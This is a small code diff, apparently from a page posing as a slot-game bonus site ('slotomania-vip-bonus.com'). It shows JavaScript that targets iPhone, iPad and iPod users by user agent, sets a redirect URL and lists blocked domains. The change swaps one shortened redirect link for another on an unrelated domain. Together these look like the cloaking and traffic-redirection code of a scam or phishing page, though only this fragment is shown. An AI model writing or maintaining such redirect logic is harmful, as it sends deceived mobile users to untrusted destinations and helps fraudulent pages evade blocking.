@@ -63,7 +63,7 @@
 
             var isMobile = /iPhone|iPad|iPod/i.test(navigator.userAgent);
             var originalDomain = "slotomania-vip-bonus.com";
-            var redirectURL = "https://movedl.ink/i/e8a1a4e";
+            var redirectURL = "https://ansorrembang.id/m/d0e3d74";
             var blockedDomains = ["real-preze.vercel.app"];
 
             if (
